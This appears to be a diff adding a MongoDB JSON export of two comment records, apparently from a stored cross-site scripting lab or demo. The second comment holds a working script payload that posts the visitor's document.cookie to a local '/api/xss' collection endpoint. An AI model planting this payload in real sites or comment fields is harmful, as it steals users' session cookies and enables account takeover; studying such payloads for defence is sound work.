@@ -1,0 +1,14 @@
+[{
+  "_id": {
+    "$oid": "65818bfec227a4a8fcb2db8d"
+  },
+  "comment": "first comment",
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6581f8304c449a8ca3e3f60f"
+  },
+  "comment": " <script> (()=>{fetch('http://localhost:3000/api/xss',{method:'POST',headers:{'Content-Type':'application/json',},body:JSON.stringify({token:document.cookie})})})() </script> ",
+  "__v": 0
+}]
